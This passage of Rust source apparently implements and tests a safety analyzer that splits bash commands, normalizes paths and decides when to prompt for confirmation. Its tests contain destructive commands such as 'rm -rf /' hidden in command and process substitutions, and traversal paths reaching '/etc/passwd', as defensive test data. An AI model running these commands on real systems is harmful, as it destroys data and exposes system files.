        ParameterExpr::MemberKeys { variable_name, .. } => return Some(variable_name),
    };
    match parameter {
        Parameter::Named(name) => Some(name),
        Parameter::NamedWithIndex { name, .. } | Parameter::NamedWithAllIndices { name, .. } => {
            Some(name)
        }
        Parameter::Positional(_) | Parameter::Special(_) => None,
    }
}

fn is_supported_alias_parameter(expr: &ParameterExpr) -> bool {
    matches!(
        expr,
        ParameterExpr::Parameter {
            parameter: Parameter::Named(_),
            indirect: false,
        }
    )
}

fn is_plain_parameter(expr: &ParameterExpr) -> bool {
    matches!(
        expr,
        ParameterExpr::Parameter { .. } | ParameterExpr::ParameterLength { .. }
    )
}

fn contains_hidden_execution(value: &str) -> bool {
    value.contains("$(") || value.contains('`') || value.contains("<(") || value.contains(">(")
}

fn replace_word_span(value: &str, start: usize, end: usize, replacement: &str) -> Option<String> {
    if start > end || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
        return None;
    }
    Some(format!(
        "{}{}{}",
        &value[..start],
        replacement,
        &value[end..]
    ))
}

fn apply_mutation_barriers(
    simple: &SimpleCommand,
    state: &mut AliasState,
    requires_confirmation: &mut Option<String>,
) {
    if changes_redirect_path_context(simple) {
        state.redirect_path_context_changed = true;
    }
    if let Some(reason) = assignment_barrier_reason(simple, state) {
        add_confirmation(requires_confirmation, reason);
        state.active.clear();
    }

    let Some(command) = simple.word_or_name.as_ref() else {
        return;
    };
    let Some(command) = literal_command_name(&command.value) else {
        if !state.active.is_empty() {
            add_confirmation(
                requires_confirmation,
                "a dynamic command name invalidates all active path aliases".to_string(),
            );
            state.active.clear();
        }
        return;
    };
    if is_alias_mutation_barrier(command) && !state.active.is_empty() {
        add_confirmation(
            requires_confirmation,
            format!("`{command}` may mutate shell state; all active path aliases were invalidated"),
        );
        state.active.clear();
    }
}

// ponytail: broad barriers trade extra prompts for small fail-closed analysis; restore
// per-builtin target parsing only if prompt data shows the precision is worthwhile.
fn changes_redirect_path_context(simple: &SimpleCommand) -> bool {
    if simple
        .prefix
        .iter()
        .flat_map(|prefix| &prefix.0)
        .chain(simple.suffix.iter().flat_map(|suffix| &suffix.0))
        .any(|item| matches!(item, CommandPrefixOrSuffixItem::AssignmentWord(_, _)))
    {
        return true;
    }
    let Some(word) = simple.word_or_name.as_ref() else {
        return false;
    };
    let Some(command) = literal_command_name(&word.value) else {
        return true;
    };
    matches!(command, "cd" | "pushd" | "popd") || is_alias_mutation_barrier(command)
}

fn assignment_barrier_reason(simple: &SimpleCommand, state: &AliasState) -> Option<String> {
    let mut has_assignment = false;
    for item in simple
        .prefix
        .iter()
        .flat_map(|prefix| &prefix.0)
        .chain(simple.suffix.iter().flat_map(|suffix| &suffix.0))
    {
        let CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) = item else {
            continue;
        };
        has_assignment = true;
        let name = match &assignment.name {
            AssignmentName::VariableName(name) | AssignmentName::ArrayElementName(name, _) => name,
        };
        if state.is_configured(name) {
            return Some(format!(
                "path alias `{name}` is assigned outside the supported declaration"
            ));
        }
    }

    (has_assignment && !state.active.is_empty()).then(|| {
        "an assignment may mutate shell state; all active path aliases were invalidated".to_string()
    })
}

fn literal_command_name(value: &str) -> Option<&str> {
    (!value.is_empty()
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'+' | b'.' | b'/')
        }))
    .then_some(value)
}

fn is_alias_mutation_barrier(command: &str) -> bool {
    matches!(
        command,
        "command"
            | "builtin"
            | "exec"
            | "eval"
            | "source"
            | "."
            | "trap"
            | "let"
            | "unset"
            | "export"
            | "readonly"
            | "declare"
            | "typeset"
            | "local"
            | "read"
            | "mapfile"
            | "readarray"
            | "getopts"
            | "printf"
            | "shopt"
            | "alias"
            | "unalias"
    )
}

fn add_confirmation(slot: &mut Option<String>, reason: String) {
    match slot {
        Some(existing) if !existing.contains(&reason) => {
            existing.push_str("; ");
            existing.push_str(&reason);
        }
        None => *slot = Some(reason),
        _ => {}
    }
}

struct WordNormalization {
    value: String,
    requires_confirmation: bool,
}

fn normalize_word_for_match(
    source: &str,
    literal_value: Option<&str>,
    cwd: &str,
    alias_expanded: bool,
    non_alias_normalization_safe: bool,
) -> WordNormalization {
    let Some(literal) = literal_value else {
        return WordNormalization {
            value: source.to_string(),
            requires_confirmation: alias_expanded,
        };
    };
    if alias_expanded && !is_literal_path(literal) {
        return WordNormalization {
            value: source.to_string(),
            requires_confirmation: true,
        };
    }
    let normalized_literal = if alias_expanded || non_alias_normalization_safe {
        normalize_literal_cwd_prefix(literal, cwd)
    } else {
        None
    };

    if alias_expanded {
        return WordNormalization {
            value: normalized_literal.unwrap_or_else(|| literal.to_string()),
            requires_confirmation: false,
        };
    }

    let value = normalized_literal.map_or_else(
        || source.to_string(),
        |literal_relative| {
            let source_relative = strip_cwd_prefix(source, cwd);
            if source_relative != source {
                normalize_empty_operand(source_relative)
            } else {
                literal_relative
            }
        },
    );
    WordNormalization {
        value,
        requires_confirmation: false,
    }
}

fn normalize_literal_cwd_prefix(value: &str, cwd: &str) -> Option<String> {
    let stripped = strip_cwd_prefix(value, cwd);
    (stripped != value && !has_parent_component(stripped))
        .then(|| normalize_empty_operand(stripped))
}

fn normalize_empty_operand(value: &str) -> String {
    // Erasing an exact-cwd operand could make it match an operand-free Allow rule; `.` preserves
    // both the operand and its shell meaning.
    if value.is_empty() {
        ".".to_string()
    } else {
        value.to_string()
    }
}

fn has_dot_prefixed_component(value: &str) -> bool {
    value.split('/').any(|component| component.starts_with('.'))
}

fn is_literal_path(value: &str) -> bool {
    value.chars().all(|ch| {
        ch == '/'
            || ch.is_ascii_alphanumeric()
            || (ch.is_ascii() && b"._@+,:=%-".contains(&(ch as u8)))
            || (!ch.is_ascii() && !ch.is_whitespace() && !ch.is_control())
    })
}

fn has_parent_component(path: &str) -> bool {
    path.split('/').any(|component| component == "..")
}

// Redirect-only leaves need the operator and any fd/ampersand prefix in command-rule match text;
// starting at the target could let a bare-target command rule authorize the shell side effect.
fn leaf_source_start(words: &[LeafWord], tokens: &[Token]) -> Option<usize> {
    let first_word_start = words
        .iter()
        .filter_map(|word| word.span)
        .map(|span| span.0)
        .min()?;
    let (index, token) = tokens
        .iter()
        .enumerate()
        .filter(|(_, token)| token.location().end.index <= first_word_start)
        .max_by_key(|(_, token)| token.location().end.index)?;
    let Token::Operator(operator, location) = token else {
        return Some(first_word_start);
    };
    if !operator.contains('<') && !operator.contains('>') {
        return Some(first_word_start);
    }

    let mut start = location.start.index;
    if let Some(previous) = index.checked_sub(1).and_then(|index| tokens.get(index))
        && previous.location().end.index == start
        && (previous.to_str() == "&" || previous.to_str().chars().all(|ch| ch.is_ascii_digit()))
    {
        start = previous.location().start.index;
    }
    Some(start)
}

#[derive(Clone, Copy)]
enum LeafTextStage {
    Original,
    Expanded,
    Normalized,
}

struct BuiltLeafText {
    text: String,
    program: Option<FilterArgument>,
    arguments: Vec<FilterArgument>,
}

fn build_leaf_text(
    words: &[LeafWord],
    chars: &[char],
    stage: LeafTextStage,
    leaf_start: Option<usize>,
) -> BuiltLeafText {
    let mut text = String::new();
    let mut program = None;
    let mut arguments = Vec::new();
    if words.is_empty() {
        return BuiltLeafText {
            text,
            program,
            arguments,
        };
    }

    if words.iter().any(|word| word.span.is_none()) {
        for word in words {
            if !text.is_empty() {
                text.push(' ');
            }
            let start = text.len();
            text.push_str(leaf_word_value(word, stage));
            record_filter_word(word, stage, start..text.len(), &mut program, &mut arguments);
        }
        return BuiltLeafText {
            text,
            program,
            arguments,
        };
    }

    let mut ordered: Vec<&LeafWord> = words.iter().collect();
    ordered.sort_by_key(|word| word.span.expect("span checked present above").0);

    let first_word_start = ordered[0].span.expect("span checked present above").0;
    let mut pos = leaf_start.unwrap_or(first_word_start);
    for word in ordered {
        let (start, end) = word.span.expect("span checked present above");
        if start > pos {
            text.extend(&chars[pos..start]);
        }
        let output_start = text.len();
        let preserve_source = match stage {
            LeafTextStage::Original => true,
            LeafTextStage::Expanded => !word.was_expanded(),
            LeafTextStage::Normalized => !word.was_expanded() && word.value == word.expanded_value,
        };
        if preserve_source {
            text.extend(&chars[start..end]);
        } else {
            text.push_str(leaf_word_value(word, stage));
        }
        record_filter_word(
            word,
            stage,
            output_start..text.len(),
            &mut program,
            &mut arguments,
        );
        pos = end.max(pos);
    }
    BuiltLeafText {
        text,
        program,
        arguments,
    }
}

fn record_filter_word(
    word: &LeafWord,
    stage: LeafTextStage,
    range: Range<usize>,
    program: &mut Option<FilterArgument>,
    arguments: &mut Vec<FilterArgument>,
) {
    if !matches!(stage, LeafTextStage::Normalized) {
        return;
    }
    let filter_word = FilterArgument {
        value: if word.role == WordRole::CommandName {
            word.value.clone()
        } else {
            word.filter_value.clone()
        },
        range,
    };
    match word.role {
        WordRole::CommandName => *program = Some(filter_word),
        WordRole::Argument => arguments.push(filter_word),
        WordRole::RedirectTarget | WordRole::Other => {}
    }
}

fn leaf_word_value(word: &LeafWord, stage: LeafTextStage) -> &str {
    match stage {
        LeafTextStage::Original => &word.original_value,
        LeafTextStage::Expanded => &word.expanded_value,
        LeafTextStage::Normalized => &word.value,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// North-star command from the plan: every leaf is a trivially-safe read-only command.
    const NORTH_STAR: &str = r#"echo "===== Is there a lib.rs? =====" && ls crates/moriarty/src/lib.rs 2>/dev/null && echo "FOUND lib.rs" || echo "NO lib.rs (binary only via main.rs)"; echo; echo "===== Cargo.toml deps =====" && cat crates/moriarty/Cargo.toml; echo; cat Cargo.toml 2>/dev/null | head -60"#;

    fn aliases(names: &[&str]) -> BTreeSet<BashPathAlias> {
        names
            .iter()
            .map(|name| BashPathAlias::validate((*name).to_string()).unwrap())
            .collect()
    }

    fn leaves(command: &str, cwd: &str) -> Vec<LeafCommand> {
        leaves_with_aliases(command, cwd, &[])
    }

    fn leaves_with_aliases(command: &str, cwd: &str, names: &[&str]) -> Vec<LeafCommand> {
        match split_command(command, cwd, &aliases(names)) {
            SplitOutcome::Commands(leaves) => leaves,
            SplitOutcome::Bail(reason) => {
                panic!("expected Commands for {command:?}, got Bail({reason:?})")
            }
        }
    }

    fn leaf_word(original: &str, normalized: &str, span: Option<(usize, usize)>) -> LeafWord {
        LeafWord {
            original_value: original.to_string(),
            expanded_value: original.to_string(),
            value: normalized.to_string(),
            filter_value: normalized.to_string(),
            role: WordRole::Other,
            span,
        }
    }

    fn p_leaves(command: &str) -> Vec<LeafCommand> {
        leaves_with_aliases(command, "/work", &["P"])
    }

    fn project_alias_leaf(reference: &str) -> LeafCommand {
        let command = format!("P=/work/project; cat {reference}");
        let mut leaves = leaves_with_aliases(&command, "/work/project", &["P"]);
        assert_eq!(leaves.len(), 1, "case {command:?}");
        leaves.remove(0)
    }

    fn confirmation_leaves(command: &str) -> Vec<LeafCommand> {
        let leaves = p_leaves(command);
        assert!(
            leaves
                .iter()
                .any(|leaf| leaf.requires_confirmation.is_some()),
            "case {command:?}: {leaves:?}"
        );
        leaves
    }

    fn texts(command: &str, cwd: &str) -> Vec<String> {
        leaves(command, cwd)
            .into_iter()
            .map(|leaf| leaf.match_text)
            .collect()
    }

    fn bail(command: &str) -> BailReason {
        bail_with_aliases(command, &[])
    }

    fn bail_with_aliases(command: &str, names: &[&str]) -> BailReason {
        match split_command(command, "", &aliases(names)) {
            SplitOutcome::Bail(reason) => reason,
            SplitOutcome::Commands(leaves) => {
                panic!("expected Bail for {command:?}, got {leaves:?}")
            }
        }
    }

    #[test]
    fn north_star_splits_into_expected_leaves() {
        assert_eq!(
            texts(NORTH_STAR, ""),
            vec![
                r#"echo "===== Is there a lib.rs? =====""#,
                "ls crates/moriarty/src/lib.rs 2>/dev/null",
                r#"echo "FOUND lib.rs""#,
                r#"echo "NO lib.rs (binary only via main.rs)""#,
                "echo",
                r#"echo "===== Cargo.toml deps =====""#,
                "cat crates/moriarty/Cargo.toml",
                "echo",
                "cat Cargo.toml 2>/dev/null",
                "head -60",
            ]
        );
    }

    #[test]
    fn north_star_retains_discard_redirects() {
        let endpoints: Vec<_> = leaves(NORTH_STAR, "")
            .into_iter()
            .flat_map(|leaf| leaf.output_redirects)
            .collect();
        assert_eq!(endpoints.len(), 2);
        assert!(endpoints.iter().all(|endpoint| matches!(
            &endpoint.target,
            ParsedRedirectTarget::Filesystem { path, .. } if path == "/dev/null"
        )));
    }

    #[test]
    fn quotes_and_escapes_keep_separators_inside_one_leaf() {
        for command in [r#"echo "a; b""#, r#"echo 'a && b'"#, r"echo a\;b"] {
            assert_eq!(leaves(command, "").len(), 1, "command {command:?}");
        }
        assert_eq!(texts(r#"echo "a; b""#, ""), vec![r#"echo "a; b""#]);
        assert_eq!(texts(r"echo a\;b", ""), vec![r"echo a\;b"]);
    }

    #[test]
    fn quoted_parens_do_not_trigger_subshell_bail() {
        assert_eq!(texts(r#"echo "(x)""#, ""), vec![r#"echo "(x)""#]);
    }

    #[test]
    fn pipeline_splits_each_stage() {
        assert_eq!(texts("a|b|c", ""), vec!["a", "b", "c"]);
    }

    #[test]
    fn newlines_split_into_separate_leaves() {
        assert_eq!(texts("echo a\necho b", ""), vec!["echo a", "echo b"]);
    }

    #[test]
    fn bails_on_unanalyzable_constructs() {
        assert_eq!(bail("cat $(whoami)"), BailReason::CommandSubstitution);
        assert_eq!(bail("echo `date`"), BailReason::CommandSubstitution);
        assert_eq!(bail("echo $((1 + 1))"), BailReason::CommandSubstitution);
        assert_eq!(bail("(ls)"), BailReason::Subshell);
        assert_eq!(bail("cat <(ls)"), BailReason::ProcessSubstitution);
        assert_eq!(bail("cat <<EOF\nhi\nEOF"), BailReason::HereDoc);
        assert_eq!(bail("cat <<<word"), BailReason::HereDoc);
        assert_eq!(bail("[[ -f x ]]"), BailReason::CompoundCommand);
        assert_eq!(bail("((1))"), BailReason::CompoundCommand);
        assert_eq!(bail("if true; then ls; fi"), BailReason::CompoundCommand);
        assert_eq!(bail(r#"echo "unbalanced"#), BailReason::ParseError);
    }

    #[test]
    fn bails_on_command_substitution_hidden_in_parameter_default() {
        // The dangerous substitution lives inside the parameter expansion's default value, which
        // the word grammar keeps as an unparsed string; configured aliases must retain the same
        // execution-construct bail even though harmless dynamic alias forms only prompt.
        assert_eq!(
            bail(r#"echo "${UNSET:-$(rm -rf /)}""#),
            BailReason::CommandSubstitution
        );
        for command in [
            "P=/work/project; echo ${P:-$(rm -rf /)}",
            "P=/work/project; echo ${P:-<(rm -rf /)}",
            "P=/work/project; echo ${P:-$((1 + 1))}",
            "P=/work/project; X=$(rm -rf /)",
            "P=/work/project; X=`rm -rf /`",
            "P=/work/project; X=$((1 + 1))",
        ] {
            assert_eq!(
                bail_with_aliases(command, &["P"]),
                BailReason::CommandSubstitution,
                "case {command:?}"
            );
        }
        // Brush rejects process substitution in this assignment spelling before leaf collection;
        // ParseError has the same whole-command fail-safe semantics.
        assert_eq!(
            bail_with_aliases("P=/work/project; X=<(rm -rf /)", &["P"]),
            BailReason::ParseError
        );
    }

    #[test]
    fn plain_parameter_expansions_are_allowed() {
        assert_eq!(texts("echo $HOME", ""), vec!["echo $HOME"]);
        assert_eq!(texts("echo ${PATH}", ""), vec!["echo ${PATH}"]);
        assert_eq!(texts("echo ${#HOME}", ""), vec!["echo ${#HOME}"]);
    }

    #[test]
    fn alias_literal_paths_have_exact_match_text() {
        for (reference, expected) in [
            (r#""$P""#, "cat ."),
            (r#""$P/runtime/mocks.js""#, "cat runtime/mocks.js"),
            (r#""${P}"/runtime/mocks.js"#, "cat runtime/mocks.js"),
            (r#""$P/src/世界.rs""#, "cat src/世界.rs"),
            (r#""$P/../secret""#, "cat /work/project/../secret"),
            (r#""$P"/../secret"#, "cat /work/project/../secret"),
            (
                r#""$P"/src/."."/."."/."."/etc/passwd"#,
                "cat /work/project/src/../../../etc/passwd",
            ),
        ] {
            let leaf = project_alias_leaf(reference);
            assert_eq!(leaf.match_text, expected, "case {reference:?}");
            assert!(leaf.requires_confirmation.is_none(), "case {reference:?}");
        }
    }

    #[test]
    fn newline_declarations_and_literal_path_punctuation_are_supported() {
        for (command, cwd, expected) in [
            (
                "P=/work/project\nrg needle $P/file",
                "/work",
                "rg needle project/file",
            ),
            (
                "P=/work/a_b-c.d,@+x:y=z%20; echo $P/file",
                "",
                "echo /work/a_b-c.d,@+x:y=z%20/file",
            ),
            (
                "P=/work/project; echo --file=$P/input pre世界$P/file $PP '$P'",
                "/work/project",
                "echo --file=/work/project/input pre世界/work/project/file $PP '$P'",
            ),
        ] {
            assert_eq!(
                leaves_with_aliases(command, cwd, &["P"])[0].match_text,
                expected
            );
        }
    }

    #[test]
    fn unsupported_alias_declarations_force_confirmation_without_hiding_later_leaves() {
        let groups = [
            (
                "value",
                "P='/work/project' ~ P=relative/path ~ P+=/work/project ~ P=(/work/project) ~ P[0]=/work/project",
            ),
            (
                "shape",
                "P=/work/project Q=/work/other ~ P=/work/project echo $P ~ P=/work/project > /dev/null",
            ),
            ("prefix", "! P=/work/project ~ time P=/work/project"),
            (
                "control",
                "P=/work/project | cat ~ P=/work/project && echo $P ~ P=/work/project & echo $P ~ echo first; P=/work/project",
            ),
        ];
        for (label, declaration) in groups
            .into_iter()
            .flat_map(|(label, cases)| cases.split(" ~ ").map(move |case| (label, case)))
        {
            let command = format!("{declaration}; echo $P; rm -rf /");
            let leaves = confirmation_leaves(&command);
            let declaration = leaves
                .iter()
                .find(|leaf| leaf.original.contains('P') && leaf.original.contains('='))
                .expect("unsupported declaration must remain analyzable");
            assert!(
                declaration.requires_confirmation.is_some(),
                "{label} case {command:?}"
            );
            assert_eq!(leaves.last().unwrap().original, "rm -rf /");
        }
    }

    #[test]
    fn alias_assignments_remain_visible_and_do_not_consume_bindings() {
        assert!(
            p_leaves("RUSTDOCFLAGS=-Dwarnings cargo doc; echo ok")
                .iter()
                .all(|leaf| leaf.requires_confirmation.is_none())
        );

        let unused = p_leaves("P=/work/project; echo ok");
        assert_eq!(unused.len(), 2);
        assert!(unused[0].requires_confirmation.is_some());

        let leaves = p_leaves("P=/work/project; X=$P");
        assert_eq!(leaves.len(), 2);
        assert!(
            leaves
                .iter()
                .all(|leaf| leaf.requires_confirmation.is_some())
        );
        assert_eq!(leaves[1].original, "X=$P");

        let reassigned = p_leaves("P=/work/project; P=$P/other; echo $P/file");
        assert_eq!(reassigned.len(), 3);
        assert!(
            reassigned
                .iter()
                .all(|leaf| leaf.requires_confirmation.is_some())
        );
    }

    #[test]
    fn unsupported_alias_references_force_confirmation() {
        let cases = "P=/work/project; echo $\"$P/file\" ~ P=/work/project; echo $P/${P} ~ P=/work/project; echo ${P:-/tmp} ~ P=/work/project; echo ${#P} ~ P=/work/project; echo ${!P} ~ P=/work/project; echo ${P/foo/bar} ~ P=/work/project; echo ${P[0]} ~ echo $P/file";
        for command in cases.split(" ~ ") {
            let leaves = confirmation_leaves(command);
            let reference = leaves
                .iter()
                .find(|leaf| leaf.original.starts_with("echo "))
                .expect("alias reference must remain analyzable");
            assert!(
                reference.requires_confirmation.is_some(),
                "case {command:?}"
            );
        }
    }

    #[test]
    fn alias_mutation_barriers_invalidate_bindings() {
        let groups = [
            (
                "shell control",
                "IFS=/|unset IFS|export IFS=/|printf -v IFS /",
            ),
            (
                "wrapped",
                "unset P|unset Q|command unset P|builtin unset P|exec echo ok",
            ),
            (
                "declaration",
                "export P=/tmp|export P+=/tmp|readonly P|declare P=/tmp|declare -n REF=P|declare -i Q=P=0|typeset P=/tmp|typeset -n REF=P|typeset -i Q=P=0|local P=/tmp|local -i Q=P=0|builtin declare -n REF=P|Q[P=0]=x",
            ),
            (
                "input",
                "read P|mapfile P|mapfile -c 1 -C 'unset P' L|readarray P|readarray -C 'unset P' L|getopts x P|printf -v P /tmp|printf -vP /tmp|printf -v 'P[0]' /tmp|printf -v 'Q[P=0]' x",
            ),
            (
                "dynamic",
                r##"let P=0|eval noop|$'eval' 'P=/tmp'|$"eval" 'P=/tmp'|source file|. file|trap noop EXIT|"$MUTATOR" P"##,
            ),
        ];
        for (label, mutation) in groups
            .into_iter()
            .flat_map(|(label, cases)| cases.split('|').map(move |case| (label, case)))
        {
            let command = format!("P=/work/project; echo $P/file; {mutation}; echo $P/after");
            let leaves = p_leaves(&command);
            assert!(
                leaves[1..]
                    .iter()
                    .all(|leaf| leaf.requires_confirmation.is_some()),
                "{label} mutation {mutation:?}: {leaves:?}"
            );
            assert_eq!(leaves[2].match_text, "echo $P/after");
            assert!(leaves[2].bindings.is_empty());
        }
    }

    fn redirect_confirmation_state(command: &str) -> (bool, bool) {
        let leaves = leaves(command, "/work/project");
        let leaf = leaves.last().unwrap();
        let endpoint_requires_confirmation = matches!(
            leaf.output_redirects.as_slice(),
            [OutputRedirectEndpoint {
                target: ParsedRedirectTarget::Unresolvable { .. },
                ..
            }]
        );
        (
            leaf.requires_confirmation.is_some(),
            endpoint_requires_confirmation,
        )
    }

    #[test]
    fn filesystem_redirects_fail_closed_after_shell_path_context_changes() {
        for mutation in [
            "cd /tmp",
            "HOME=/tmp",
            "printf hello",
            "export PATH",
            "read NAME",
            "shopt -s expand_aliases",
            "alias jump='cd /tmp'",
            "unalias jump",
            "shopt -s expand_aliases; alias jump='cd /tmp'; jump",
            "$MUTATOR",
        ] {
            let command = format!("{mutation}; echo hi > ~/out");
            assert_eq!(
                redirect_confirmation_state(&command),
                (true, true),
                "case {command}"
            );
        }
        for command in [
            "cd /tmp; echo hi 2>&1",
            "echo HOME > out",
            "echo one; echo hi > out",
            "> discarded; echo hi > out",
        ] {
            assert_eq!(redirect_confirmation_state(command), (false, false));
        }
        for command in [
            "HOME=/tmp echo hi > ~/out",
            "printf hello > out",
            "export PATH > out",
        ] {
            assert_eq!(redirect_confirmation_state(command), (true, true));
        }
    }

    #[test]
    fn retains_every_output_redirect_and_excludes_input_only_forms() {
        for (command, analyzable, expand_home_tilde) in [
            ("echo x > out.txt", Some("out.txt"), false),
            ("echo x >> out.txt", Some("out.txt"), false),
            ("echo x >| out.txt", Some("out.txt"), false),
            ("echo x &> out.txt", Some("out.txt"), false),
            ("echo x &>> out.txt", Some("out.txt"), false),
            ("echo x >& out.txt", Some("out.txt"), false),
            ("echo x <> out.txt", Some("out.txt"), false),
            ("echo x > 1", Some("1"), false),
            (r#"echo x > "quoted path""#, Some("quoted path"), false),
            (r"echo x > escaped\ path", Some("escaped path"), false),
            ("echo x > ~/report.txt", Some("~/report.txt"), true),
            ("echo x > '~/report.txt'", Some("~/report.txt"), false),
            (r#"echo x > "~/report.txt""#, Some("~/report.txt"), false),
            (r"echo x > \~/report.txt", Some("~/report.txt"), false),
            ("echo x > $OUT", None, false),
            ("echo x > *.txt", None, false),
            ("echo x > @(one|two)", None, false),
            ("echo x > +(one|two)", None, false),
            ("echo x > !(one|two)", None, false),
            ("echo x > {one,two}", None, false),
        ] {
            let leaves = leaves(command, "");
            let [endpoint] = leaves[0].output_redirects.as_slice() else {
                panic!("expected one file endpoint for {command:?}");
            };
            let (actual_target, actual_expansion) = match &endpoint.target {
                ParsedRedirectTarget::Filesystem {
                    path,
                    expand_home_tilde,
                } => (Some(path.as_str()), *expand_home_tilde),
                ParsedRedirectTarget::Unresolvable { .. } => (None, false),
                ParsedRedirectTarget::Descriptor { .. } => {
                    panic!("expected filesystem target for {command:?}")
                }
            };
            assert_eq!(actual_target, analyzable, "case {command:?}");
            assert_eq!(actual_expansion, expand_home_tilde, "case {command:?}");
        }

        for (command, expected) in [
            ("ls 2>&1", "&1"),
            (r#"ls 2>&"1""#, "&1"),
            ("ls >&-", "&-"),
            ("ls >&2", "&2"),
        ] {
            assert!(
                matches!(
                    leaves(command, "")[0].output_redirects.as_slice(),
                    [OutputRedirectEndpoint {
                        target: ParsedRedirectTarget::Descriptor { match_text },
                        ..
                    }] if match_text == expected
                ),
                "expected descriptor {expected:?} for {command:?}"
            );
            assert_eq!(texts(command, ""), vec![command]);
        }

        assert!(matches!(
            leaves("echo 2>&foo", "")[0].output_redirects.as_slice(),
            [OutputRedirectEndpoint {
                target: ParsedRedirectTarget::Unresolvable { reason },
                ..
            }] if reason == INVALID_DESCRIPTOR_REASON
        ));

        for command in ["echo hi", "cat < input.txt", "cat 0<&1"] {
            assert!(
                leaves(command, "")[0].output_redirects.is_empty(),
                "expected no output endpoint for {command:?}"
            );
        }
        assert_eq!(texts("cat 0<&1", ""), ["cat 0<&1"]);
    }

    #[test]
    fn redirect_only_leaves_retain_their_operators() {
        assert_eq!(texts("> out", ""), ["> out"]);
        assert_eq!(texts("2> out", ""), ["2> out"]);
        assert_eq!(texts("&> out", ""), ["&> out"]);
        assert_eq!(
            texts("> out; echo hi > other", ""),
            ["> out", "echo hi > other"]
        );
    }

    #[test]
    fn descriptor_source_never_uses_text_from_a_comment() {
        let leaves = leaves("# &1\nrm -rf / >&1", "");
        assert_eq!(leaves.len(), 1);
        assert_eq!(leaves[0].match_text, "rm -rf / >&1");
        assert!(matches!(
            leaves[0].output_redirects.as_slice(),
            [OutputRedirectEndpoint {
                target: ParsedRedirectTarget::Descriptor { match_text },
                ..
            }] if match_text == "&1"
        ));
    }

    #[test]
    fn output_redirects_preserve_source_order_and_static_analysis() {
        let leaves = leaves("echo x > one 2> two", "");
        let redirects = &leaves[0].output_redirects;
        assert_eq!(
            redirects
                .iter()
                .map(|endpoint| match &endpoint.target {
                    ParsedRedirectTarget::Filesystem { .. } => endpoint.original_target.as_str(),
                    ParsedRedirectTarget::Descriptor { .. }
                    | ParsedRedirectTarget::Unresolvable { .. } => {
                        panic!("expected file endpoint")
                    }
                })
                .collect::<Vec<_>>(),
            ["one", "two"]
        );
    }

    #[test]
    fn redirect_to_real_file_keeps_operator_in_leaf_text() {
        assert_eq!(texts("echo x > out.txt", ""), vec!["echo x > out.txt"]);
    }

    #[test]
    fn normalizes_in_cwd_absolute_paths() {
        for (path, expected) in [
            ("/abs/cwd", "cat ."),
            ("/abs/cwd/src/foo.rs", "cat src/foo.rs"),
            ("/abs/cwd/src/世界.rs", "cat src/世界.rs"),
        ] {
            assert_eq!(texts(&format!("cat {path}"), "/abs/cwd"), vec![expected]);
        }
    }

    #[test]
    fn normalization_leaves_unrelated_paths_untouched() {
        // Outside cwd, already-relative, parent-traversal, and partial-directory-name matches are
        // all left exactly as written.
        assert_eq!(
            texts("cat /etc/passwd", "/abs/cwd"),
            vec!["cat /etc/passwd"]
        );
        assert_eq!(texts("cat src/foo.rs", "/abs/cwd"), vec!["cat src/foo.rs"]);
        assert_eq!(
            texts("cat /abs/cwd/../secret", "/abs/cwd"),
            vec!["cat /abs/cwd/../secret"]
        );
        assert_eq!(
            texts("cat /abs/cwdX/foo", "/abs/cwd"),
            vec!["cat /abs/cwdX/foo"]
        );
    }

    #[test]
    fn empty_cwd_disables_normalization() {
        // The replay path falls back to an empty cwd for records that predate cwd logging; the
        // absolute path must then pass through untouched rather than being mangled.
        assert_eq!(
            texts("cat /abs/cwd/src/foo.rs", ""),
            vec!["cat /abs/cwd/src/foo.rs"]
        );
    }

    #[test]
    fn normalization_preserves_other_tokens_byte_for_byte() {
        // Only the in-cwd path is rewritten; the quoted argument keeps its quotes and spaces.
        assert_eq!(
            texts(r#"cat /abs/cwd/a.rs "keep me""#, "/abs/cwd"),
            vec![r#"cat a.rs "keep me""#]
        );
    }

    #[test]
    fn normalizes_redirect_target_paths() {
        let leaf = &leaves("cat < /abs/cwd/input.txt", "/abs/cwd")[0];
        assert_eq!(leaf.match_text, "cat < input.txt");
        assert!(leaf.output_redirects.is_empty());
    }

    #[test]
    fn unicode_command_slices_by_char_not_byte() {
        // A multi-byte argument before another token would corrupt a byte-indexed slice.
        assert_eq!(texts("echo 世界 ok", ""), vec!["echo 世界 ok"]);
    }

    #[test]
    fn build_leaf_text_falls_back_when_a_span_is_missing() {
        // Directly exercise the missing-span fallback, which is otherwise hard to trigger because
        // the parser populates spans for ordinary words.
        let words = vec![
            leaf_word("cat", "cat", Some((0, 3))),
            leaf_word("/abs/cwd/foo.rs", "src/foo.rs", None),
        ];
        let chars: Vec<char> = "cat /abs/cwd/foo.rs".chars().collect();
        assert_eq!(
            build_leaf_text(&words, &chars, LeafTextStage::Normalized, None).text,
            "cat src/foo.rs"
        );
    }

    #[test]
    fn fd_dup_target_classification() {
        assert_eq!(descriptor_match_text("1").as_deref(), Some("&1"));
        assert_eq!(descriptor_match_text("2-").as_deref(), Some("&2-"));
        assert_eq!(descriptor_match_text("-").as_deref(), Some("&-"));
        assert_eq!(descriptor_match_text("out.txt"), None);
        assert_eq!(descriptor_match_text(""), None);
    }
}
